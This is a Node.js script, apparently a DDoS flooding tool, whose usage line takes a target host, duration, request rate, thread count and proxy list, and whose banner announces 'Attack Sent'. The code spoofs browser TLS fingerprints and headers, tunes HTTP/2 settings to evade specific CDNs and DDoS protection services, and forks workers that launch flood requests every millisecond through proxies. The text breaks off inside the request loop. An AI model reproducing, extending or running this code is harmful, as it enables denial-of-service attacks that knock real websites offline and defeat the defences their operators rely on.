const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const JA3_PROFILES = {
    "chrome": {
        ciphers: "GREASE:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        ecdhCurve: "GREASE:X25519:P-256:P-384:P-521",
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
    "firefox": {
        ciphers: "GREASE:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_DHE_RSA_WITH_AES_128_GCM_SHA256:TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384",
        ecdhCurve: "GREASE:X25519:P-256:P-384",
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
    "safari": {
        ciphers: "GREASE:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
        ecdhCurve: "GREASE:X25519:P-256",
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
};

const BROWSER_PROFILES = {
    "chrome": {
        platforms: ["Windows", "macOS", "Linux", "Android"],
        versions: { min: 120, max: 127 },
        acceptEncodings: ["gzip, deflate, br, zstd", "gzip, deflate, br"],
        acceptLanguages: ["en-US,en;q=0.9", "en;q=0.8", "vi-VN,vi;q=0.9,en-US;q=0.8"],
        secFetchDests: ["document", "script", "image", "style", "font", "media", "manifest", "worker", "empty"],
        secFetchModes: ["navigate", "cors", "no-cors", "same-origin"],
        secFetchSites: ["same-origin", "same-site", "cross-site", "none"],
        cacheControls: ["no-cache", "max-age=0", "no-store, must-revalidate"],
        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
            "sec-ch-ua": `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platform}"`,
            "sec-ch-ua-platform-version": randomElement(platformVersions[platform]) || undefined,
            "sec-ch-ua-arch": randomElement(architectures),
            "sec-ch-ua-full-version-list": `"${browser.replace("mobile-", "")}";v="${fullVersion}", "Not-A.Brand";v="99.0.0.0"`,
            "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
        })
    },
    "firefox": {
        platforms: ["Windows", "macOS", "Linux", "Android"],
        versions: { min: 120, max: 130 },
        acceptEncodings: ["gzip, deflate, br", "gzip, deflate"],
        acceptLanguages: ["en-US,en;q=0.9", "en;q=0.8", "vi-VN,vi;q=0.9,en-US;q=0.8"],
        secFetchDests: ["document", "script", "image", "style", "font", "media", "manifest", "worker", "empty"],
        secFetchModes: ["navigate", "cors", "no-cors", "same-origin"],
        secFetchSites: ["same-origin", "same-site", "cross-site", "none"],
        cacheControls: ["no-cache", "max-age=0", "no-store, must-revalidate"],
        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
            "te": "trailers",
            "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
        })
    },
    "safari": {
        platforms: ["macOS", "iOS"],
        versions: { min: 17, max: 18 },
        acceptEncodings: ["gzip, deflate, br"],
        acceptLanguages: ["en-US,en;q=0.9", "en;q=0.8"],
        secFetchDests: ["document", "script", "image", "style", "font", "media", "manifest", "worker", "empty"],
        secFetchModes: ["navigate", "cors", "no-cors", "same-origin"],
        secFetchSites: ["same-origin", "same-site", "cross-site", "none"],
        cacheControls: ["no-cache", "max-age=0", "no-store, must-revalidate"],
        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
            "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
        })
    },
    "edge": "chrome", "brave": "chrome", "opera": "chrome", "duckduckgo": "chrome",
    "mobile-chrome": "chrome", "mobile-safari": "safari", "mobile-firefox": "firefox",
};

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com', 'youtube.com', 'facebook.com', 'baidu.com', 'wikipedia.org',
    'x.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'
];

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.join(':');

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: node b.js <host> <time> <req> <thread> <proxy.txt>`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor() {}

    async SOCKS5(options, callback) {
        const address = options.address.split(':');
        socks.createConnection({
            proxy: {
                host: options.host,
                port: options.port,
                type: 5
            },
            command: 'connect',
            destination: {
                host: address[0],
                port: +address[1]
            }
        }, (error, info) => {
            if (error) {
                return callback(undefined, error);
            } else {
                return callback(info.socket, undefined);
            }
        });
    }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const lookupPromise = util.promisify(dns.lookup);
let isp;
let geoCountryCode = 'US';

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            geoCountryCode = data.countryCode;
        }
    } catch (error) {}
}

const targetURL = parsedTarget.host;
getIPAndISP(targetURL);

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    const min = 1000;
    const max = 5222;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (cluster.isMaster) {
    console.clear();
    console.log('\x1b[38;2;243;12;255m╔═════════════╦[+]║Attack \x1b[38;5;55mSent║[+]╦═════════════╗\x1b[0m');
    console.log(`\x1b[1;36m  [Target]   : \x1b[38;5;55m${process.argv[2]}\x1b[0m`);
    console.log(`\x1b[1;36m  [proxy]    : ${process.argv[6]}\x1b[38;5;55m   || Total: ${proxies.length.toString()}`);
    console.log(`\x1b[1;36m  [Duration] : \x1b[38;5;55m${process.argv[3]} seconds\x1b[0m`);
    console.log(`\x1b[1;36m  [Rate]     : \x1b[38;5;55m${process.argv[4]} req/s\x1b[0m`);
    console.log(`\x1b[1;36m  [Threads]  : \x1b[38;5;55m${process.argv[5]}\x1b[0m`);
    console.log(`\x1b[1;36m  [Owner]    : \x1b[38;5;55m Minh Duc \x1b[0m`);
    console.log('\x1b[38;2;243;12;255m╚═════════════╩[+]║Leak \x1b[38;5;55mDDOS║[+]╩═════════════╝\x1b[0m');

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1);
}

const browsers = ["chrome", "safari", "firefox", "edge", "brave", "opera", "duckduckgo", "mobile-chrome", "mobile-safari", "mobile-firefox"];
const platformVersions = {
    "Windows": ["10.0.0", "11.0.0"],
    "macOS": ["10.15.7", "11.6.0", "12.0.0", "13.0.0", "14.0.0"],
    "Linux": [undefined],
    "Android": ["10.0", "11.0", "12.0", "13.0", "14.0"],
    "iOS": ["15.0", "16.0", "17.0", "18.0"]
};
const architectures = ["x86_64", "arm64"];
const mobileDevices = {
    "Android": ["Pixel 6", "Samsung Galaxy S21", "Xiaomi 12", "OnePlus 9", "Huawei P40"],
    "iOS": ["iPhone 12", "iPhone 13", "iPhone 14", "iPhone 15"]
};

const referers = [
    "https://www.google.com/search?q=", "https://www.bing.com/search?q=", 
    "https://www.youtube.com/watch?v=", "https://www.reddit.com/r/",
    "https://x.com/explore", "https://www.facebook.com/",
    "https://www.instagram.com/p/", "https://www.tiktok.com/@",
    "https://www.linkedin.com/feed/", "https://www.wikipedia.org/wiki/"
];
const origins = [
    "https://www.google.com", "https://www.youtube.com", 
    "https://www.reddit.com", "https://x.com", 
    "https://www.facebook.com", "https://www.instagram.com",
    "https://www.tiktok.com", "https://www.linkedin.com"
];

const resourcePaths = [
    { path: parsedTarget.path || "/", dest: "document" },
    { path: '/assets/css/style.css', dest: "style" },
    { path: '/assets/js/main.js', dest: "script" },
    { path: '/images/logo.png', dest: "image" },
    { path: '/favicon.ico', dest: "image" },
    { path: '/about', dest: "document" },
    { path: '/contact', dest: "document" },
    { path: '/blog/post-123', dest: "document" },
    { path: '/api/data', dest: "empty" },
    { path: '/search?q=test', dest: "document" },
    { path: '/products/category/item', dest: "document" },
];

function getRandomBrowser() {
    const weights = {
        "chrome": 0.35, "mobile-chrome": 0.25, "safari": 0.15, "mobile-safari": 0.15,
        "firefox": 0.05, "mobile-firefox": 0.03, "edge": 0.015, 
        "brave": 0.01, "opera": 0.005, "duckduckgo": 0.005
    };
    const total = Object.values(weights).reduce((a, b) => a + b, 0);
    const rand = Math.random() * total;
    let sum = 0;
    for (const browser in weights) {
        sum += weights[browser];
        if (rand <= sum) return browser;
    }
    return "chrome";
}

function uapick(browser, version, platform, isMobile, fullVersion) {
    const osVersion = randomElement(platformVersions[platform] || ["10.0"]);
    const device = isMobile ? randomElement(mobileDevices[platform] || mobileDevices["Android"]) : "";
    const osString = platform === "Windows" ? `Windows NT ${osVersion}; Win64; x64` :
                     platform === "macOS" ? `Macintosh; Intel Mac OS X ${osVersion.replace(/\./g, "_")}` :
                     platform === "Linux" ? "X11; Linux x86_64" :
                     platform === "Android" ? `Linux; Android ${osVersion}; ${device}` :
                     `iPhone; CPU iPhone OS ${osVersion.replace(/\./g, "_")} like Mac OS X`;

    const userAgents = {
        "chrome": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`,
        "safari": `Mozilla/5.0 (${osString}) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Safari/605.1.${Math.floor(Math.random() * 20)}`,
        "firefox": `Mozilla/5.0 (${osString}${platform === "Android" ? "; Mobile" : ""}) Gecko/${version}.0 Firefox/${version}.0`,
        "edge": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Edg/${fullVersion}`,
        "brave": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Brave/${version}`,
        "opera": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0`,
        "duckduckgo": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 DuckDuckGo/${version}`,
        "mobile-chrome": `Mozilla/5.0 (${osString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Mobile Safari/537.36`,
        "mobile-safari": `Mozilla/5.0 (${osString}) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`,
        "mobile-firefox": `Mozilla/5.0 (${osString}; rv:${version}.0) Gecko/${version}.0 Firefox/${version}.0`
    };
    return userAgents[browser];
}

class SessionManager {
    constructor() {
        this.cookies = new Map();
        this.cache = new Map();
    }

    addCookies(host, cookies) {
        if (!this.cookies.has(host)) {
            this.cookies.set(host, new Map());
        }
        const cookieMap = this.cookies.get(host);
        cookies.forEach(cookie => {
            const [name, value] = cookie.split(';')[0].split('=');
            cookieMap.set(name.trim(), value.trim());
        });
    }

    getCookieHeader(host) {
        if (!this.cookies.has(host)) return null;
        const cookieMap = this.cookies.get(host);
        return Array.from(cookieMap.entries()).map(([name, value]) => `${name}=${value}`).join('; ');
    }

    addCacheHeaders(path, etag, lastModified) {
        if (!this.cache.has(path)) {
            this.cache.set(path, {});
        }
        const cacheEntry = this.cache.get(path);
        if (etag) cacheEntry.etag = etag;
        if (lastModified) cacheEntry.lastModified = lastModified;
    }

    getCacheHeaders(path) {
        return this.cache.get(path) || null;
    }
}

function getRandomUA() {
    const version = Math.floor(Math.random() * (139 - 127 + 1)) + 127;
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
}

function headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode) {
    const ua = getRandomUA();
    const versionMatch = ua.match(/Chrome\/(\d+)/)[1];
    const chromeVersion = parseInt(versionMatch);
    let brandValue;
    if (chromeVersion >= 127 && chromeVersion <= 130) {
        brandValue = `"Not;A=Brand";v="8", "Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}"`;
    } else if (chromeVersion >= 131 && chromeVersion <= 134) {
        brandValue = `"Google Chrome";v="${chromeVersion}", "Not=A?Brand";v="99", "Chromium";v="${chromeVersion}"`;
    } else if (chromeVersion >= 135 && chromeVersion <= 139) {
        brandValue = `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not;A=Brand";v="8"`;
    }
    const secChUa = `${brandValue}`;
    const secChUaFull = `${brandValue}`;

    const resource = randomElement(resourcePaths);
    const acceptLanguagesMap = {
        "US": "en-US,en;q=0.9",
        "VN": "vi-VN,vi;q=0.9,en-US;q=0.8",
        "JP": "ja-JP,ja;q=0.9,en-US;q=0.8",
        "DE": "de-DE,de;q=0.9,en-US;q=0.8",
        "FR": "fr-FR,fr;q=0.9,en-US;q=0.8",
        "CN": "zh-CN,zh;q=0.9,en-US;q=0.8"
    };
    const acceptLanguage = acceptLanguagesMap[geoCountryCode] || "vi,en-US;q=0.9,en;q=0.8";

    const acceptTypes = {
        "document": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "script": "application/javascript,*/*;q=0.8",
        "style": "text/css,*/*;q=0.8",
        "image": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
        "empty": "application/json, text/plain, */*;q=0.8"
    };

    const headersArray = [
        [":method", Math.random() < 0.95 ? "GET" : "HEAD"],
        [":authority", parsedTarget.host],
        [":scheme", "https"],
        [":path", resource.path],
        ["user-agent", ua],
        ["sec-ch-ua", secChUa],
        ["sec-ch-ua-mobile", isMobile ? "?1" : "?0"],
        ["sec-ch-ua-platform", "\"Windows\""],
        ["sec-ch-ua-full-version-list", secChUaFull],
        ["accept", acceptTypes[resource.dest] || acceptTypes["document"]],
        ["sec-fetch-site", "cross-site"],
        ["sec-fetch-mode", resource.dest === "document" ? "navigate" : "cors"],
        ["sec-fetch-user", resource.dest === "document" ? "?1" : undefined],
        ["sec-fetch-dest", resource.dest],
        ["referer", `https://www.google.com/search?q=${generateRandomString(5, 10)}`],
        ["accept-encoding", "gzip, deflate, br, zstd"],
        ["accept-language", acceptLanguage],
        ["upgrade-insecure-requests", "1"],
        ["cache-control", "no-cache"],
        ["priority", "u=0, i"]
    ];

    const headers = Object.fromEntries(headersArray);

    if (Math.random() < 0.4) {
        headers["if-modified-since"] = new Date(Date.now() - Math.floor(Math.random() * 86400000)).toUTCString();
    }
    if (Math.random() < 0.3) {
        headers["if-none-match"] = `"${generateRandomString(10, 20)}"`;
    }

    Object.keys(headers).forEach(key => headers[key] === undefined && delete headers[key]);

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";

    const browser = "chrome";
    let browserProfile = BROWSER_PROFILES[browser];
    if (typeof browserProfile === 'string') {
        browserProfile = BROWSER_PROFILES[browserProfile];
    }

    const version = Math.floor(Math.random() * (139 - 127 + 1)) + 127;
    const platform = "Windows";
    const isMobile = false;
    const fullVersion = `${version}.0.0.0`;

    const baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);

    let ja3Profile = JA3_PROFILES[browser];
    if (!ja3Profile) {
        ja3Profile = {
            ciphers: ciphers,
            sigalgs: SignalsList,
            ecdhCurve: ecdhCurve,
            secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
        };
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${parsedTarget.host}:443`,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) {
            console.log(`[Error] Proxy connection failed: ${error}`);
            return;
        }
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ja3Profile.ciphers,
            requestCert: true,
            sigalgs: ja3Profile.sigalgs,
            socket: connection,
            ecdhCurve: ja3Profile.ecdhCurve,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            secureProtocol: ja3Profile.secureProtocol,
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

        const dynamicSecureContext = tls.createSecureContext({
            ciphers: tlsOptions.ciphers,
            sigalgs: tlsOptions.sigalgs,
            honorCipherOrder: tlsOptions.honorCipherOrder,
            secureOptions: tlsOptions.secureOptions,
            secureProtocol: tlsOptions.secureProtocol
        });
        tlsOptions.secureContext = dynamicSecureContext;

        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);

        function generateJA3Fingerprint(socket) {
            const cipherInfo = socket.getCipher();
            const supportedVersions = socket.getProtocol();
            if (!cipherInfo) {
                console.log('[Error] Failed to generate JA3 fingerprint: No cipher info');
                return null;
            }
            const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
            const md5Hash = crypto.createHash('md5');
            md5Hash.update(ja3String);
            return md5Hash.digest('hex');
        }

        tlsSocket.on('connect', () => {
            const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
            console.log(`[Info] TLS connected, JA3: ${ja3Fingerprint}`);
        });

        tlsSocket.on('error', (err) => {
            console.log(`[Error] TLS error: ${err.message}`);
        });

        function getSettingsBasedOnISP(isp) {
            const defaultSettings = {
                headerTableSize: 65536,
                initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
                maxHeaderListSize: 262144,
                enablePush: false,
                maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
                maxFrameSize: 16384,
                enableConnectProtocol: false,
            };

            const settings = { ...defaultSettings };

            if (isp === 'Cloudflare, Inc.') {
                settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
                settings.initialWindowSize = 65536;
                settings.maxFrameSize = 16384;
                settings.enableConnectProtocol = false;
            } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 65536;
                settings.maxFrameSize = 16777215;
                settings.maxConcurrentStreams = 128;
                settings.maxHeaderListSize = 4294967295;
            } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.maxConcurrentStreams = 100;
                settings.initialWindowSize = 6291456;
                settings.maxFrameSize = 16384;
                settings.maxHeaderListSize = 32768;
            } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 65535;
                settings.maxFrameSize = 16384;
                settings.maxConcurrentStreams = 100;
                settings.maxHeaderListSize = 4294967295;
            } else if (isp === 'Ddos-guard LTD') {
                settings.maxConcurrentStreams = 8;
                settings.initialWindowSize = 65535;
                settings.maxFrameSize = 16777215;
                settings.maxHeaderListSize = 262144;
            } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
                settings.maxConcurrentStreams = 100;
                settings.initialWindowSize = 65535;
                settings.maxHeaderListSize = 262144;
            } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 8388608;
                settings.maxFrameSize = 16384;
                settings.maxConcurrentStreams = 100;
                settings.maxHeaderListSize = 4294967295;
            } else if (isp === 'Google LLC') {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 1048576;
                settings.maxFrameSize = 16384;
                settings.maxConcurrentStreams = 100;
                settings.maxHeaderListSize = 137216;
            } else {
                settings.headerTableSize = 65535;
                settings.maxConcurrentStreams = 1000;
                settings.initialWindowSize = 6291456;
                settings.maxHeaderListSize = 261144;
                settings.maxFrameSize = 16384;
            }

            return settings;
        }

    let hpack = new HPACK();
        let client;
        const clients = [];
        client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings: getSettingsBasedOnISP(isp),
            socket: tlsSocket,
        });
        clients.push(client);
        client.setMaxListeners(0);

        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });

        client.on('connect', () => {
            console.log('[Info] HTTP/2 connected');
            client.ping((err, duration, payload) => {
                if (err) console.log(`[Error] Ping failed: ${err.message}`);
            });
            client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
        });

        client.on('error', (err) => {
            console.log(`[Error] HTTP/2 error: ${err.message}`);
        });

        const sessionManager = new SessionManager();

        clients.forEach(client => {
            const intervalId = setInterval(async () => {
